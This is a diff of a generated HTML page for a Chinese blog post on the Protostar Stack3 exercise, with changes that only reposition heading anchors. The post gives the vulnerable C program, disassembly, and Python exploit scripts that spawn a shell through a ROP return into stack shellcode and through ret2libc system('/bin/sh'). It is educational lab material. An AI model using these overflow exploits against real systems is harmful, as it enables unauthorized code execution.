@@ -17,20 +17,20 @@
   
   <title>Protostar-栈溢出学习-ROP执行shellcode | 4ch12dy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00 序#
+  <meta name="description" content="#0x00 序
  和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。
 
-0x01 stack3##include &amp;lt;stdlib.h&amp;gt;
+#0x01 stack3#include &amp;lt;stdlib.h&amp;gt;
 #include &amp;lt;unistd.h&amp;gt;
 #include &amp;lt;stdi">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Protostar-栈溢出学习-ROP执行shellcode">
 <meta property="og:url" content="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/index.html">
 <meta property="og:site_name" content="4ch12dy">
-<meta property="og:description" content="0x00 序#
+<meta property="og:description" content="#0x00 序
  和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。
 
-0x01 stack3##include &amp;lt;stdlib.h&amp;gt;
+#0x01 stack3#include &amp;lt;stdlib.h&amp;gt;
 #include &amp;lt;unistd.h&amp;gt;
 #include &amp;lt;stdi">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-0.png?raw=true">
@@ -42,10 +42,10 @@
 <meta property="og:updated_time" content="2017-05-02T14:33:55.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar-栈溢出学习-ROP执行shellcode">
-<meta name="twitter:description" content="0x00 序#
+<meta name="twitter:description" content="#0x00 序
  和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。
 
-0x01 stack3##include &amp;lt;stdlib.h&amp;gt;
+#0x01 stack3#include &amp;lt;stdlib.h&amp;gt;
 #include &amp;lt;unistd.h&amp;gt;
 #include &amp;lt;stdi">
 <meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-0.png?raw=true">
@@ -187,10 +187,10 @@
             
         </div>
         <div class="content" style="overflow: auto">
-            <h2><span id="0x00-xu">0x00 序</span><a href="#0x00-xu" class="header-anchor">#</a></h2><blockquote>
+            <h2><a href="#0x00-xu" class="header-anchor">#</a><span id="0x00-xu">0x00 序</span></h2><blockquote>
 <p> 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。</p>
 </blockquote>
-<h2><span id="0x01-stack3">0x01 stack3</span><a href="#0x01-stack3" class="header-anchor">#</a></h2><pre><code>#include &lt;stdlib.h&gt;
+<h2><a href="#0x01-stack3" class="header-anchor">#</a><span id="0x01-stack3">0x01 stack3</span></h2><pre><code>#include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
@@ -220,11 +220,11 @@ int main(int argc, char **argv)
   getpath();
 
 }
-</code></pre><h2><span id="0x02-si-lu-amp-fen-xi">0x02 思路&amp;分析</span><a href="#0x02-si-lu-amp-fen-xi" class="header-anchor">#</a></h2><p>整体上和前面的没太大区别，现在有个问题在于<code>__builtin_return_address()</code>会返回当前的返回地址值，然后后面<code>ret &amp; 0xbf000000) == 0xbf000000</code>对其返回地址进行了限制–返回地址不能是<code>0xbf</code>为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。</p>
+</code></pre><h2><a href="#0x02-si-lu-amp-fen-xi" class="header-anchor">#</a><span id="0x02-si-lu-amp-fen-xi">0x02 思路&amp;分析</span></h2><p>整体上和前面的没太大区别，现在有个问题在于<code>__builtin_return_address()</code>会返回当前的返回地址值，然后后面<code>ret &amp; 0xbf000000) == 0xbf000000</code>对其返回地址进行了限制–返回地址不能是<code>0xbf</code>为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。</p>
 <p>怎么绕过呢？</p>
 <p><strong>Ret2libc or ROP(return orientated programming)</strong></p>
-<h2><span id="0x03-rop">0x03 ROP</span><a href="#0x03-rop" class="header-anchor">#</a></h2><p>一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到<code>getpath()</code>的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。</p>
-<h3><span id="getpath-hui-bian">getpath()汇编</span><a href="#getpath-hui-bian" class="header-anchor">#</a></h3><pre><code>Dump of assembler code for function getpath:
+<h2><a href="#0x03-rop" class="header-anchor">#</a><span id="0x03-rop">0x03 ROP</span></h2><p>一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到<code>getpath()</code>的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。</p>
+<h3><a href="#getpath-hui-bian" class="header-anchor">#</a><span id="getpath-hui-bian">getpath()汇编</span></h3><pre><code>Dump of assembler code for function getpath:
 0x08048484 &lt;getpath+0&gt;:    push   ebp
 0x08048485 &lt;getpath+1&gt;:    mov    ebp,esp
 0x08048487 &lt;getpath+3&gt;:    sub    esp,0x68
@@ -257,7 +257,7 @@ int main(int argc, char **argv)
 0x080484f3 &lt;getpath+111&gt;:    call   0x80483c0 &lt;printf@plt&gt;
 0x080484f8 &lt;getpath+116&gt;:    leave  
 0x080484f9 &lt;getpath+117&gt;:    ret
-</code></pre><h3><span id="diao-shi-amp-hack">调试&amp;hack</span><a href="#diao-shi-amp-hack" class="header-anchor">#</a></h3><p>测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。</p>
+</code></pre><h3><a href="#diao-shi-amp-hack" class="header-anchor">#</a><span id="diao-shi-amp-hack">调试&amp;hack</span></h3><p>测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。</p>
 <pre><code>import struct
 padding =  &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39;
 ret  = struct.pack(&quot;I&quot;, 0x080484f9)
@@ -269,11 +269,11 @@ print padding+ret+eip_after_ret+nopslide+payload
 <p>here we go!</p>
 <p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-0.png?raw=true" alt="3-0"></p>
 <p>成功运行bash！</p>
-<h2><span id="0x04-ret2libc">0x04 Ret2libc</span><a href="#0x04-ret2libc" class="header-anchor">#</a></h2><p>这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用<code>system(&quot;/bin/sh&quot;)</code>。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串<code>&quot;/bin/sh&quot;</code>压入栈中。下面我们就来做两件事：</p>
+<h2><a href="#0x04-ret2libc" class="header-anchor">#</a><span id="0x04-ret2libc">0x04 Ret2libc</span></h2><p>这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用<code>system(&quot;/bin/sh&quot;)</code>。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串<code>&quot;/bin/sh&quot;</code>压入栈中。下面我们就来做两件事：</p>
 <pre><code>*  1，找到system在内存中的地址
 *  2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址
-</code></pre><h3><span id="system-amp-quot-bin-sh-quot"><code>system</code> &amp; <code>&quot;/bin/sh&quot;</code></span><a href="#system-amp-quot-bin-sh-quot" class="header-anchor">#</a></h3><p>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-1.png?raw=true" alt="3-1"><br>  先找到<code>/lib/libc-2.11.2.so</code>在内存中的位置<br>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-2.png?raw=true" alt="3-2"><br>  然后找到字符串<code>&quot;/bin/sh&quot;</code>在<code>/lib/libc-2.11.2.so</code>中的偏移<br> <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-3.png?raw=true" alt="3-3"><br>验证：所以<code>&quot;/bin/sh&quot;</code>为<code>0xb7fb63bf</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-4.png?raw=true" alt="3-4"></p>
-<h3><span id="hack">hack</span><a href="#hack" class="header-anchor">#</a></h3><p>编写对应的Python脚本</p>
+</code></pre><h3><a href="#system-amp-quot-bin-sh-quot" class="header-anchor">#</a><span id="system-amp-quot-bin-sh-quot"><code>system</code> &amp; <code>&quot;/bin/sh&quot;</code></span></h3><p>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-1.png?raw=true" alt="3-1"><br>  先找到<code>/lib/libc-2.11.2.so</code>在内存中的位置<br>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-2.png?raw=true" alt="3-2"><br>  然后找到字符串<code>&quot;/bin/sh&quot;</code>在<code>/lib/libc-2.11.2.so</code>中的偏移<br> <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-3.png?raw=true" alt="3-3"><br>验证：所以<code>&quot;/bin/sh&quot;</code>为<code>0xb7fb63bf</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-4.png?raw=true" alt="3-4"></p>
+<h3><a href="#hack" class="header-anchor">#</a><span id="hack">hack</span></h3><p>编写对应的Python脚本</p>
 <pre><code>import struct
 padding =  &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39;
 system  = struct.pack(&quot;I&quot;,0xb7ecffb0) #system地址
@@ -281,8 +281,8 @@ system  = struct.pack(&quot;I&quot;,0xb7ecffb0) #system地址
 ret_after_system = &#39;AAAA&#39; #返回地址，不重要
 bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf) #参数/bin/sh地址
 print padding+system+ret_after_system+bin_sh
-</code></pre><h3><span id="ce-shi">测试</span><a href="#ce-shi" class="header-anchor">#</a></h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-5.png?raw=true" alt="3-5"></p>
-<h3><span id="cooooool-make-it">cooooool! make it!</span><a href="#cooooool-make-it" class="header-anchor">#</a></h3><h2><span id="0x05-xiao-jie">0x05 小结</span><a href="#0x05-xiao-jie" class="header-anchor">#</a></h2><p>学习到现在，一句话总结就是：你知道得越多才知道知道得越少。</p>
+</code></pre><h3><a href="#ce-shi" class="header-anchor">#</a><span id="ce-shi">测试</span></h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-5.png?raw=true" alt="3-5"></p>
+<h3><a href="#cooooool-make-it" class="header-anchor">#</a><span id="cooooool-make-it">cooooool! make it!</span></h3><h2><a href="#0x05-xiao-jie" class="header-anchor">#</a><span id="0x05-xiao-jie">0x05 小结</span></h2><p>学习到现在，一句话总结就是：你知道得越多才知道知道得越少。</p>
 
         </div>
         <div class="post-reply">
